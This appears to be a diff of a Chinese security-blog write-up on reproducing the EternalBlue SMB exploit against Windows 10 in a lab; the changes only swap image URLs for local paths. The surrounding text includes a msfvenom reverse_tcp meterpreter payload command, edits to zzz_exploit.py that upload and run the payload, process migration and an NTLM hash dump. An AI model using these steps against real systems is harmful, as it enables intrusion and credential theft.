@@ -119,7 +119,7 @@ Windows 2000 SP4 x86
 
 但是在上述列表中，该漏洞甚至还影响`Windows10`、`Windows server2016`等，所以在这里复现的时候，查找了很多资料，只在`YouTube`上看到部分复现的视频，上面复现使用的是`Windows server2016 standard Evaluation`版本，后来我们尝试使用非常多的镜像版本去尝试复现：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oEShVz4p0LsV8JQDF6cwGl9rwmHF7dibIzlhWdsibzDkrLoR25n0oh80vww/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/49757ef3cddda5f3f417e1a6eb91b4c79e772953d2bcf896299d16d2db3f5ddf.png)  
 
 其中有一个`Windows10 pro`英文版，其他师傅短暂复现成功过一次之后，其他均失败。
 
@@ -154,12 +154,12 @@ ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jul_2016_x64_d
 
 先关闭其他的杂项，关闭`Windows defender`：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESylZVaxojWAot6HtfibJOdJsH1rS0e1LWeR5q67g9iazaUPKTgNKR9prg/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/81e9ce960f08fd88fbd83e46c1f759f2f71b5bb07cfb7686079e8df82a89427d.png)  
 
 关闭防火墙等，不设置可匿名访问的共享，在这里查看`ip`和版本信息：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESXQGBEJIDW1dlaRIicKBjfwwicjtR8Z9mib15ru4gicIFiaXVbyicoVLvyUvw/640?wx_fmt=png)  
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESFzTrwJdtoxc3Q0PcKxxcQDQfsWYzibU2qYTibOwYNAg8TeziceIofORxw/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/e004ba4eaa1ac63c5b9c7afc238b4366063a20e155b2927d064808d25df5a9aa.png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/925e25797df192e62610565bf9a3594e19aa3e70b4d7a0dd80418a40063682a4.png)  
 
 使用`msf6`来进行测试：
 
@@ -167,29 +167,29 @@ ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jul_2016_x64_d
 
 使用第一个进行测试，在这里面的第二个`2023`的那个，是老版本`msf5`里面的，是我自己加上去的，后续再说：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oES6b7Ce6r138r8VFKl7P9otfs4gffyrUYVqE8q1glRZ5lrNDjNI1ecNQ/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a92d16b03125af3aecfe0cb2ad4dd2698cbf26e2bf2eeb6008b632ba34923bc9.png)  
 
 在这里发现，无论如何`run`，都会存在一个错误，这是网络连接错误，在这里就按照上面师傅的要求**设置可匿名访问的共享**，再跑：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESr0Sxr7T1Wrqgicib33jQzib0ibYSPk3B9RnqNfGI3ic6jXadicJtcJQrHOkg/640?wx_fmt=png)  
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESbSicrSiacOWurmzkl7icglBZM1ZqK0jFWJFn6Imne7CKDKpS4FmTVPbPg/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a4f7b07e335c7db8d9c5e6511b8d18afdae18f33d0b9d13f60660f6f64f12744.png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/31b359283b38705db94f51b5be969f549b9197bfc1002df0f7ad12dd2435d784.png)  
 
 在这里设置为`\`，保存之后再跑一下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oES6m2YgicvtA6V0d0muIREjzWfx4jT186D65BMIs9HVmDtIF9K6IzyTfA/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/7e1cb72014836a47ddadf89ef561771079f105c14298b41d82bfa8be92b859f0.png)  
 
 这次没有错误了，但是你无论如何`run`，会话就回不来，看下当前模块支持的系统类型：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oES3diadGegDVmE06ia0MuZc8FLyZg8ZpS5rdEeuTSuy0wHYzj2VpUgXJIw/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/1d1eb1fc56a60a55d7e3703955f2345609bd4757d478e1ebeebf04a26a167540.png)  
 
 当前是支持这里面的`win10`的，可能是系统不对的问题，如果使用老版的`msf`来执行的话，其实可以直接弹回来的，在这里借用`橘子`师傅的截图：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESdCNGtMU3ZmTm9jdJ759KADJ7DqTGRCfn9QrCzI6SJicAFXED1M17Y1w/640?wx_fmt=png)  
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESEYXAODWjX6RtBj1OgdPCKsPOevkVO87j1PGbcdTibtgafhKZmFaQQ5Q/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f39a446bd960c5e9050b1961d4c5b574b32636382aa258fac734f1a81ef3e941.png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/2f64238286959e83cd901df5f45e91a52c34efb119c34059d74739a1e8ad498d.png)  
 
 当然如果将`msf5`版本的模块直接放到`msf6`里面使用的话，会因为一些问题发生报错，可能是因为版本的问题：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oES0HDXibSwTGtKb4oyBLffT3hRdaOX4WNoktXclMVnqD3XM481OSHzzHw/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/0e207b02a008b111b62665ca3ac4082025db09b8a01b95aa4ef55299ac89aeef.png)  
 
 ### 2.2 工具版
 
@@ -221,11 +221,11 @@ python checker.py 192.168.135.28
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oES0qON7avc1uetTnCrabHLIVaicZibNarVUx3YYGtbMOzZAPxD5zzr5ApA/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a8eed3a7e9704cbe9e2a808f6f6cfbd385fc9038e093459517e7855293994011.png)  
 
 上图是正常的，如果是不正常的会显示：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESVqdDskUno3Dk1tibtn59jleO1AyoyibVYTCbIcXibEZcAz4dibxMJAictlg/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/603d768adcfd4d4114b8bfe333e6e9a46600eaa08b18cbda873bd1a9f32e3c5c.png)  
 
 当前如果再执行`exp`的话，会失败。
 
@@ -239,7 +239,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.30.1.214  LPORT=7788  -f  e
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESqyjOd0MmrTzt1JyrLH1nPbhKLhCmgxIIJ7UnAl20PUjSdic242LBt3Q/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/8af79aa69cd723177ec6412cbbfdf7ab293b2a82e3a277b74960b45d3659551a.png)  
 
 另外一侧，打开`msf`，准备接收会话：
 
@@ -253,13 +253,13 @@ run
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESAgIlwYO7mHaqoM0tsiaKBOgfsXjiavbrgnvOGmI3QUNWoo0ql1ibztczw/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/e969e4572b19f6ea8f613f2849e75e3a3fe24de8de3fb6a80a1ba47e2b94961f.png)  
 
 打开刚下载的代码中的`zzz_exploit.py`文件，注释以下几行：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oES8nPibWZB2eP6adKibPkuqu1icicV0I9vm5df6LRn6rPhmQbJLPNCA4yC6Q/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/eff3c74db257ff104cacc977b6b56b379761b0c2643bf3fb0fd6d82708e84285.png)  
 
-取消注释以下几行，并修改其中的文件：![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESjWiauI4DhbhlWXe9ibTIApSrpoMnibRwY9EBEzSQicBW6tj9ZzgNIRlsKg/640?wx_fmt=png)
+取消注释以下几行，并修改其中的文件：![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/eca670cfff48ad109ab82aadf601bf37a5b7094cbeea2fab3203084e1dff4ef1.png)
 
 在这里注意：第一个`7788.exe`是要和你的脚本在同一个文件夹下，如果不在的话，可以写其他的绝对路径，比如：`/tmp/1.exe`，如果永恒之蓝漏洞执行成功的话，就会将这个文件传到靶机的`C`盘下，文件名就是`7788.exe`。修改好之后，准备执行：
 
@@ -269,16 +269,16 @@ python zzz_exploit.py  192.168.135.28 netlogon(这个可以不带)
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oEScM0AbWIxpNxJxk12nSRIkprWibBcP62OJfGzqFXUn4NlMJG9P0Lpy1w/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/4f01c8220a3bcf9e2bff643cf654ab43fb566f9004e57c87e7b6b58f64a60878.png)  
 
 此时会话就弹回来了：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESl6Iiag5myUZHpPCHEBESiaLRz1VEpPcUYg21HrfR2OecMe4xhjGXbACg/640?wx_fmt=png)  
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESO91MmIMIPrdoVJJTS6CfCD4fGJq8u24eCgBMhINKrRMwmicJNCNwGkg/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/c1b87be0fc6d391d348b1821f4e57ea6690fb5901e17852017fbdc7fbc3ab6d6.png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/350ee21c4e7d4b10811510b06154ec5f87f6ce7550f9abdfd4f564451daa1528.png)  
 
 此时尝试抓取`hash`：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESibPJ2Uj4MfwNZQYcibEeia7w44YQ35CDpgflPvpVhFYR0gMbHa6OKxvUg/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/cdd7225b97ffba00160ad389236e1b3106750969959dd22dfa3dd7469541871d.png)  
 
 显示无法抓取，应该是进程问题，将进程由`x86`的迁移至`x64`的应该就可以了，查看下当前的进程：
 
@@ -294,11 +294,11 @@ meterpreter > ps
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESnicB1veahzcicQ5GL0smQxNic01DkPvHHXlnahrSUr9G0iazJavUk01atQ/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/27639630f0b74f7e97ee9bb40a015cb7e29854bcde5a4a121c064b83084c4ae2.png)  
 
 将当前的进程迁移至`session`为`0`，权限是`system`的`x64`的进程上来：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESfQRJNB46KtDy1lCsSvMF9ic8HnibuQ0EPwqoemsOqB3IaqzKNJFiaMNmw/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/3df440bf3a05fad61d026a5e2b8ae16bbb3de47b96507b1e2b7c8d80262e069f.png)  
 
 迁移到`308`上：
 
@@ -315,11 +315,11 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESdokyazickicbQMQxEuhS3LHic4NsTLNeLQGU9Kv9zI1FSWG4OUSLJ8WfQ/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/180e4ee344cbee4c2f4690cf44603d0376e69b72f20af240c52238faa694443b.png)  
 
 再进行解密即可：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESUp1EZGqIWc4dDbABcoSicPCsdQ6uQgJYTXiaYWMK488f8VKwPmOFlDWA/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/195a61a4907cca6ffc422cf38e16c6e4cb5f0f554dc9f53f31cbaebf0825fea8.png)  
 
 ### 2.3 影响 Windows10 漏洞的因素
 
@@ -338,7 +338,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 并在本地安全策略中，关闭以下选项，重启之后再测试：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1BnlXqhSgLDhQV4IWyw1oESYNZnfKHiaNB0jkfibOnMJMspMFvenGJHVxvHYU7SIsIGxia0q7wfRHia1g/640?wx_fmt=png)  
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/95694a351fb2db968e6996ac7197ba5a29855140512160cf94def456636012fb.png)  
 
 3. 总结
 =====
@@ -347,13 +347,13 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 tips：加我 wx，拉你入群，一起学习
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJOca699BJK50FDxBNnhRZrS1hyXb2K4AkLTYfJwticmyHQxv3X6vZHfQ/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/4146ddead8b3275fb4ad3f77acc24319ebfbf0c220f8acefbd7bbd0ee51b09ce.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1CIQMic7eibrf45I1BAyu02iagmOZ70PmiaFwfKDMDZ7vuAicZ0cz6jYsYZHPLlVV63HvE4oz1CxjOmGhQ/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/7ee2d983d48eae08e5027991dbceca30341eaa8662320aed98d76f6e21dc581e.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CibE0jlnugbX5SLGI9312kOrkH7gXIN5NPic75bQ8WbAFMEqvZiaQ0WSk4W9eYUfJJRzlMgibjic8mIGicMvjialoDgmQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/70860a31ae8f501cf5c7091f9ccfc7c5c328b1f6131e137352ae35d5a1ec26e1.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJkslQQ2B5nDuKBlpbKHHtME5RBrJsYucDbPWpyglY02yicRq93PTWn7w/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/9dabb2363040f0c22206158a4692cb7a4c54e78c07ad2fab94af5342792e477a.jpg)
 
 扫取二维码获取
 
@@ -361,7 +361,7 @@ tips：加我 wx，拉你入群，一起学习
 
 乌鸦安全
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Bt3mgRlo88wGCQuAJ2kv0pzM18jFmpv4CJEBMNAicGSSvDlWSN6DG5JJ0Q8EI6oEuaZS0QNyAojYw/640?wx_fmt=gif)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/48b01a30cd9d6162cffb9c2d9e709f02f0a1a027412c4149bff2424182c92e15.gif)
 
 ---
 
